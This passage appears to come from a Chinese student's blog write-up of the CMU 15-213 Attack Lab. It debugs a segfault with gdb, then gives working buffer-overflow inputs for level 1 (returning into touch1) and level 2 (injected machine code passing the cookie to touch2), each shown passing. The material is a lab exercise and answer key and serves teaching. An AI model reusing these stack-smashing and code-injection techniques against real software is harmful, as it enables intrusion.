<p>对这里<code>display $eflag</code>可知，这个cmp判断相等，随后就导致了错误</p>
<p>查询<code>ctarget.d</code>，可知执行过的launch函数如下</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">0000000000401eb4</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">launc</span><span style="color:#E1E4E8">h</span><span style="color:#F97583">></span><span style="color:#9ECBFF">:</span></span>
<span class="line"><span style="color:#B392F0">  401eb4:</span><span style="color:#79B8FF">	55</span><span style="color:#9ECBFF">                   	push</span><span style="color:#9ECBFF">   %rbp</span></span>
<span class="line"><span style="color:#B392F0">  401eb5:</span><span style="color:#79B8FF">	48</span><span style="color:#79B8FF"> 89</span><span style="color:#9ECBFF"> e5</span><span style="color:#9ECBFF">             	mov</span><span style="color:#9ECBFF">    %rsp,%rbp</span></span>
<span class="line"><span style="color:#B392F0">  401eb8:</span><span style="color:#79B8FF">	48</span><span style="color:#79B8FF"> 83</span><span style="color:#9ECBFF"> ec</span><span style="color:#79B8FF"> 10</span><span style="color:#9ECBFF">          	sub</span><span style="color:#E1E4E8">    $0x10</span><span style="color:#9ECBFF">,%rsp</span></span>
<span class="line"><span style="color:#B392F0">  401ebc:</span><span style="color:#79B8FF">	48</span><span style="color:#79B8FF"> 89</span><span style="color:#9ECBFF"> fa</span><span style="color:#9ECBFF">             	mov</span><span style="color:#9ECBFF">    %rdi,%rdx</span></span>
<span class="line"><span style="color:#B392F0">  401ebf:</span><span style="color:#79B8FF">	64</span><span style="color:#79B8FF"> 48</span><span style="color:#9ECBFF"> 8b</span><span style="color:#79B8FF"> 04</span><span style="color:#79B8FF"> 25</span><span style="color:#79B8FF"> 28</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> 	mov</span><span style="color:#9ECBFF">    %fs:0x28,%rax</span></span>
<span class="line"><span style="color:#B392F0">  401ec6:</span><span style="color:#79B8FF">	00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">  401ec8:</span><span style="color:#79B8FF">	48</span><span style="color:#79B8FF"> 89</span><span style="color:#79B8FF"> 45</span><span style="color:#9ECBFF"> f8</span><span style="color:#9ECBFF">          	mov</span><span style="color:#9ECBFF">    %rax,-0x8</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rbp</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#B392F0">  401ecc:</span><span style="color:#79B8FF">	31</span><span style="color:#9ECBFF"> c0</span><span style="color:#9ECBFF">                	xor</span><span style="color:#9ECBFF">    %eax,%eax</span></span>
<span class="line"><span style="color:#B392F0">  401ece:</span><span style="color:#79B8FF">	48</span><span style="color:#9ECBFF"> 8d</span><span style="color:#79B8FF"> 47</span><span style="color:#9ECBFF"> 1e</span><span style="color:#9ECBFF">          	lea</span><span style="color:#79B8FF">    0x1e</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rdi</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">,%rax</span></span>
<span class="line"><span style="color:#B392F0">  401ed2:</span><span style="color:#79B8FF">	48</span><span style="color:#79B8FF"> 83</span><span style="color:#9ECBFF"> e0</span><span style="color:#9ECBFF"> f0</span><span style="color:#9ECBFF">          	and</span><span style="color:#E1E4E8">    $0xfffffffffffffff0</span><span style="color:#9ECBFF">,%rax</span></span>
<span class="line"><span style="color:#B392F0">  401ed6:</span><span style="color:#79B8FF">	48</span><span style="color:#79B8FF"> 29</span><span style="color:#9ECBFF"> c4</span><span style="color:#9ECBFF">             	sub</span><span style="color:#9ECBFF">    %rax,%rsp</span></span>
<span class="line"><span style="color:#B392F0">  401ed9:</span><span style="color:#79B8FF">	48</span><span style="color:#9ECBFF"> 8d</span><span style="color:#9ECBFF"> 7c</span><span style="color:#79B8FF"> 24</span><span style="color:#9ECBFF"> 0f</span><span style="color:#9ECBFF">       	lea</span><span style="color:#79B8FF">    0xf</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rsp</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">,%rdi</span></span>
<span class="line"><span style="color:#B392F0">  401ede:</span><span style="color:#79B8FF">	48</span><span style="color:#79B8FF"> 83</span><span style="color:#9ECBFF"> e7</span><span style="color:#9ECBFF"> f0</span><span style="color:#9ECBFF">          	and</span><span style="color:#E1E4E8">    $0xfffffffffffffff0</span><span style="color:#9ECBFF">,%rdi</span></span>
<span class="line"><span style="color:#B392F0">  401ee2:</span><span style="color:#9ECBFF">	be</span><span style="color:#9ECBFF"> f4</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF">       	mov</span><span style="color:#E1E4E8">    $0xf4</span><span style="color:#9ECBFF">,%esi</span></span>
<span class="line"><span style="color:#B392F0">  401ee7:</span><span style="color:#9ECBFF">	e8</span><span style="color:#79B8FF"> 14</span><span style="color:#9ECBFF"> ee</span><span style="color:#9ECBFF"> ff</span><span style="color:#9ECBFF"> ff</span><span style="color:#9ECBFF">       	call</span><span style="color:#9ECBFF">   400d00</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">memset@pl</span><span style="color:#E1E4E8">t</span><span style="color:#F97583">></span></span>
<span class="line"><span style="color:#B392F0">  401eec:</span><span style="color:#79B8FF">	48</span><span style="color:#9ECBFF"> 8b</span><span style="color:#79B8FF"> 05</span><span style="color:#9ECBFF"> ad</span><span style="color:#79B8FF"> 25</span><span style="color:#79B8FF"> 20</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> 	mov</span><span style="color:#79B8FF">    0x2025ad</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rip</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">,%rax</span><span style="color:#6A737D">        # 6044a0 &#x3C;stdin@GLIBC_2.2.5></span></span>
<span class="line"><span style="color:#B392F0">  401ef3:</span><span style="color:#79B8FF">	48</span><span style="color:#79B8FF"> 39</span><span style="color:#79B8FF"> 05</span><span style="color:#9ECBFF"> d6</span><span style="color:#79B8FF"> 25</span><span style="color:#79B8FF"> 20</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> 	cmp</span><span style="color:#9ECBFF">    %rax,0x2025d6</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rip</span><span style="color:#E1E4E8">)        </span><span style="color:#6A737D"># 6044d0 &#x3C;infile></span></span>
<span class="line"><span style="color:#B392F0">  401efa:</span><span style="color:#79B8FF">	75</span><span style="color:#79B8FF"> 14</span><span style="color:#9ECBFF">                	jne</span><span style="color:#9ECBFF">    401f10</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">launch+0x5</span><span style="color:#E1E4E8">c</span><span style="color:#F97583">></span></span></code></pre>
<p>考虑将gdb时的汇编丢给ai，问一下含义</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">23│</span><span style="color:#9ECBFF"> support.c:</span></span>
<span class="line"><span style="color:#B392F0">24│</span><span style="color:#79B8FF">    0x0000000000401eec</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+5</span><span style="color:#F97583">6></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    mov</span><span style="color:#79B8FF">    0x2025ad</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rip</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">,%rax</span><span style="color:#6A737D">        # 0x6044a0 &#x3C;stdin@@GLIBC_2.2.5></span></span>
<span class="line"><span style="color:#B392F0">25│</span><span style="color:#79B8FF">    0x0000000000401ef3</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+6</span><span style="color:#F97583">3></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    cmp</span><span style="color:#9ECBFF">    %rax,0x2025d6</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rip</span><span style="color:#E1E4E8">)        </span><span style="color:#6A737D"># 0x6044d0 &#x3C;infile></span></span>
<span class="line"><span style="color:#B392F0">26│</span><span style="color:#79B8FF">    0x0000000000401efa</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+7</span><span style="color:#F97583">0></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    jne</span><span style="color:#79B8FF">    0x401f10</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">launch+9</span><span style="color:#F97583">2></span></span></code></pre>
<p>简单理解，这里是一个SPJ（spacial judge），判断输入文件是否是输入流，是则做特殊执行。</p>
<p>我们通过以下命令查看两边的值以及输入流的值，发现确实是都是输入流的值，因此，这里可能直接触发了特殊判断然后进了segment fault，网上都没有提到这一点。</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">x/x</span><span style="color:#E1E4E8"> $rip </span><span style="color:#9ECBFF">+</span><span style="color:#79B8FF"> 0x2025d6</span></span>
<span class="line"><span style="color:#B392F0">p/x</span><span style="color:#E1E4E8"> $rax</span></span>
<span class="line"><span style="color:#B392F0">p/x</span><span style="color:#9ECBFF"> stdin</span></span></code></pre>
<p>随后，可以尝试通过查看我们问题的二次复现</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">./ctarget</span><span style="color:#79B8FF"> -q</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> ./ctarget.l1.txt)</span></span></code></pre>
<p>发现这个和gdb一致，也会存在问题</p>
<h6 id="gdb解决了该问题后">gdb解决了该问题后</h6>
<p>尝试一下调用，发现现在会调用test函数了，但是和<code>write-up</code>中写的仍有出入。</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">./ctarget</span><span style="color:#79B8FF"> -q</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "00 00 00 00 00 ac"))</span></span></code></pre>
<p>通过该命令即可解决无法成功运行的问题</p>
<p>总结一下解决方案，就是严格按照<code>write-up</code>中写的参数调用即可，包括输入流为文件的情况。</p>
<p>现在就可以开始正式的调试了。</p>
<p>这个比上面要简单,首先打个getbuf断点</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0"> 1│</span><span style="color:#9ECBFF"> Dump</span><span style="color:#9ECBFF"> of</span><span style="color:#9ECBFF"> assembler</span><span style="color:#9ECBFF"> code</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> function</span><span style="color:#9ECBFF"> getbuf:</span></span>
<span class="line"><span style="color:#B392F0"> 2│</span><span style="color:#9ECBFF"> buf.c:</span></span>
<span class="line"><span style="color:#B392F0"> 3│</span><span style="color:#79B8FF"> 12</span><span style="color:#9ECBFF">      in</span><span style="color:#9ECBFF"> buf.c</span></span>
<span class="line"><span style="color:#B392F0"> 4├──</span><span style="color:#E1E4E8">> </span><span style="color:#79B8FF">0x00000000004017a8</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+</span><span style="color:#F97583">0></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">     sub</span><span style="color:#E1E4E8">    $0x28</span><span style="color:#9ECBFF">,%rsp</span></span></code></pre>
<p>可见开了一个40字节的栈帧。
然后我们直接查看touch1的地址即可</p>
<p>三种方式</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">p</span><span style="color:#9ECBFF"> touch1</span></span>
<span class="line"><span style="color:#E1E4E8">$17 = </span><span style="color:#B392F0">{void</span><span style="color:#E1E4E8"> ()} 0x4017c0 </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">touch</span><span style="color:#F97583">1></span></span>
<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">info</span><span style="color:#9ECBFF"> address</span><span style="color:#9ECBFF"> touch1</span></span>
<span class="line"><span style="color:#B392F0">Symbol</span><span style="color:#9ECBFF"> "touch1"</span><span style="color:#9ECBFF"> is</span><span style="color:#9ECBFF"> a</span><span style="color:#9ECBFF"> function</span><span style="color:#9ECBFF"> at</span><span style="color:#9ECBFF"> address</span><span style="color:#9ECBFF"> 0x4017c0.</span></span>
<span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> nm</span><span style="color:#9ECBFF"> ./ctarget</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#9ECBFF"> touch1</span></span>
<span class="line"><span style="color:#B392F0">00000000004017c0</span><span style="color:#9ECBFF"> T</span><span style="color:#9ECBFF"> touch1</span></span></code></pre>
<p>然后遵循字节序，赋值一下 ctarget.l1.txt</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span></span>
<span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span></span>
<span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span></span>
<span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span></span>
<span class="line"><span style="color:#B392F0">00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span></span>
<span class="line"><span style="color:#B392F0">c0</span><span style="color:#79B8FF"> 17</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#E1E4E8"> </span></span></code></pre>
<p>这里有回车也没关系</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> ./ctarget</span><span style="color:#79B8FF"> -q</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> ctarget.l1.txt)</span></span>
<span class="line"><span style="color:#B392F0">Cookie:</span><span style="color:#79B8FF"> 0x59b997fa</span></span>
<span class="line"><span style="color:#B392F0">Touch1!:</span><span style="color:#9ECBFF"> You</span><span style="color:#9ECBFF"> called</span><span style="color:#9ECBFF"> touch1</span><span style="color:#E1E4E8">()</span></span>
<span class="line"><span style="color:#B392F0">Valid</span><span style="color:#9ECBFF"> solution</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> level</span><span style="color:#79B8FF"> 1</span><span style="color:#9ECBFF"> with</span><span style="color:#9ECBFF"> target</span><span style="color:#9ECBFF"> ctarget</span></span>
<span class="line"><span style="color:#B392F0">PASS:</span><span style="color:#9ECBFF"> Would</span><span style="color:#9ECBFF"> have</span><span style="color:#9ECBFF"> posted</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> following:</span></span>
<span class="line"><span style="color:#B392F0">        user</span><span style="color:#9ECBFF"> id</span><span style="color:#9ECBFF"> bovik</span></span>
<span class="line"><span style="color:#B392F0">        course</span><span style="color:#9ECBFF">  15213-f15</span></span>
<span class="line"><span style="color:#B392F0">        lab</span><span style="color:#9ECBFF">     attacklab</span></span>
<span class="line"><span style="color:#B392F0">        result</span><span style="color:#9ECBFF">  1:PASS:0xffffffff:ctarget:1:00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF"> C0</span><span style="color:#79B8FF"> 17</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span><span style="color:#79B8FF"> 00</span></span></code></pre>
<h3 id="level-2">Level 2</h3>
<p>需要注入一小段代码，作为exploit string的一部分</p>
<blockquote>
<p>Within the file <code>ctarget</code> there is code for a function <code>touch2</code> having the following C representation:
<img src="https://s2.loli.net/2025/08/17/sX8wJCQLAl53W9c.png" alt="touch2" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/17/sX8wJCQLAl53W9c.png?w=640 640w, https://s2.loli.net/2025/08/17/sX8wJCQLAl53W9c.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p>Your task is to get <code>CTARGET</code> to execute the code for <code>touch2</code> rather than returning to <code>test</code>. In this case, however, you must make it appear to <code>touch2</code> as if you have passed your cookie as its argument.</p>
<p>Do not attempt to use <code>jmp</code> or <code>call</code> instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use <code>ret</code> instructions for all transfers of control, even when you are not returning from a call.</p>
</blockquote>
<p>简单的用中文说，就是通过返回值调用touch2，同时传入参数——我们自己的cookie，限制使用jmp和call</p>
<p>首先查询cookie的地址值，touch2的地址值</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">p/x</span><span style="color:#E1E4E8"> &#x26;</span><span style="color:#B392F0">cookie</span></span>
<span class="line"><span style="color:#E1E4E8">$20 = 0x6044e4</span></span>
<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">p</span><span style="color:#9ECBFF"> touch2</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#E1E4E8">$21 = {</span><span style="color:#B392F0">void</span><span style="color:#E1E4E8"> (unsigned </span><span style="color:#9ECBFF">int</span><span style="color:#E1E4E8">)} 0x4017ec </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">touch</span><span style="color:#F97583">2></span></span></code></pre>
<p>然后尝试去编写注入代码</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>movq    $59b997fa, %rdi #或movq 0x6044e4 %rdi</span></span>
<span class="line"><span>pushq   $0x4017ec</span></span>
<span class="line"><span>ret</span></span></code></pre>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>main:</span></span>
<span class="line"><span>        movq	$0x59b997fa, %rdi</span></span>
<span class="line"><span>        pushq	$0x4017ec</span></span>
<span class="line"><span>        ret</span></span></code></pre>
<p>然后编译并objdump</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> gcc</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> injection.l2.s</span><span style="color:#E1E4E8"> </span></span>
<span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> objdump</span><span style="color:#79B8FF"> -d</span><span style="color:#9ECBFF"> injection.l2.o</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">injection.l2.o:</span><span style="color:#9ECBFF">     file</span><span style="color:#9ECBFF"> format</span><span style="color:#9ECBFF"> elf64-x86-64</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">Disassembly</span><span style="color:#9ECBFF"> of</span><span style="color:#9ECBFF"> section</span><span style="color:#9ECBFF"> .text:</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">0000000000000000</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">mai</span><span style="color:#E1E4E8">n</span><span style="color:#F97583">></span><span style="color:#9ECBFF">:</span></span>
<span class="line"><span style="color:#B392F0">   0:</span><span style="color:#79B8FF">   48</span><span style="color:#9ECBFF"> c7</span><span style="color:#9ECBFF"> c7</span><span style="color:#9ECBFF"> fa</span><span style="color:#79B8FF"> 97</span><span style="color:#9ECBFF"> b9</span><span style="color:#79B8FF"> 59</span><span style="color:#9ECBFF">    mov</span><span style="color:#E1E4E8">    $0x59b997fa</span><span style="color:#9ECBFF">,%rdi</span></span>
<span class="line"><span style="color:#B392F0">   7:</span><span style="color:#79B8FF">   68</span><span style="color:#9ECBFF"> ec</span><span style="color:#79B8FF"> 17</span><span style="color:#79B8FF"> 40</span><span style="color:#79B8FF"> 00</span><span style="color:#9ECBFF">          push</span><span style="color:#E1E4E8">   $0x4017ec</span></span>
<span class="line"><span style="color:#B392F0">   c:</span><span style="color:#9ECBFF">   c3</span><span style="color:#9ECBFF">                      ret</span><span style="color:#E1E4E8">    </span></span></code></pre>
<p>将dump出的机械码写入答案，也就是getbuf写入函数的顶部,然后40个字节处写下rsp在调用gets时的地址值即可。</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0"> 1│</span><span style="color:#9ECBFF"> Dump</span><span style="color:#9ECBFF"> of</span><span style="color:#9ECBFF"> assembler</span><span style="color:#9ECBFF"> code</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> function</span><span style="color:#9ECBFF"> getbuf:</span></span>
<span class="line"><span style="color:#B392F0"> 2│</span><span style="color:#9ECBFF"> buf.c:</span></span>
<span class="line"><span style="color:#B392F0"> 3│</span><span style="color:#79B8FF"> 12</span><span style="color:#9ECBFF">      in</span><span style="color:#9ECBFF"> buf.c</span></span>
<span class="line"><span style="color:#B392F0"> 4│</span><span style="color:#79B8FF">    0x00000000004017a8</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+</span><span style="color:#F97583">0></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">     sub</span><span style="color:#E1E4E8">    $0x28</span><span style="color:#9ECBFF">,%rsp</span></span>
<span class="line"><span style="color:#B392F0"> 5│</span></span>
<span class="line"><span style="color:#B392F0"> 6│</span><span style="color:#79B8FF"> 13</span><span style="color:#9ECBFF">      in</span><span style="color:#9ECBFF"> buf.c</span></span>
<span class="line"><span style="color:#B392F0"> 7│</span><span style="color:#79B8FF"> 14</span><span style="color:#9ECBFF">      in</span><span style="color:#9ECBFF"> buf.c</span></span>
<span class="line"><span style="color:#B392F0"> 8├──</span><span style="color:#E1E4E8">> </span><span style="color:#79B8FF">0x00000000004017ac</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+</span><span style="color:#F97583">4></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">     mov</span><span style="color:#9ECBFF">    %rsp,%rdi</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">x/gx</span><span style="color:#E1E4E8"> $rsp</span></span>
<span class="line"><span style="color:#B392F0">0x5561dc78:</span><span style="color:#79B8FF">     0x0000000000000000</span></span></code></pre>
<p>即最终答案为</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="txt"><code><span class="line"><span>48 c7 c7 fa 97 b9 59 68 </span></span>
<span class="line"><span>ec 17 40 00 c3 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>78 dc 61 55 00 00 00 00</span></span></code></pre>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> ./ctarget</span><span style="color:#79B8FF"> -q</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> ctarget.l2.txt)</span></span>
<span class="line"><span style="color:#B392F0">Cookie:</span><span style="color:#79B8FF"> 0x59b997fa</span></span>
<span class="line"><span style="color:#B392F0">Touch2!:</span><span style="color:#9ECBFF"> You</span><span style="color:#9ECBFF"> called</span><span style="color:#9ECBFF"> touch2</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">0x59b997fa</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#B392F0">Valid</span><span style="color:#9ECBFF"> solution</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> level</span><span style="color:#79B8FF"> 2</span><span style="color:#9ECBFF"> with</span><span style="color:#9ECBFF"> target</span><span style="color:#9ECBFF"> ctarget</span></span>
<span class="line"><span style="color:#B392F0">PASS:</span><span style="color:#9ECBFF"> Would</span><span style="color:#9ECBFF"> have</span><span style="color:#9ECBFF"> posted</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> following:</span></span>
<span class="line"><span style="color:#B392F0">        user</span><span style="color:#9ECBFF"> id</span><span style="color:#9ECBFF"> bovik</span></span>
<span class="line"><span style="color:#B392F0">        course</span><span style="color:#9ECBFF">  15213-f15</span></span>
<span class="line"><span style="color:#B392F0">        lab</span><span style="color:#9ECBFF">     attacklab</span></span>
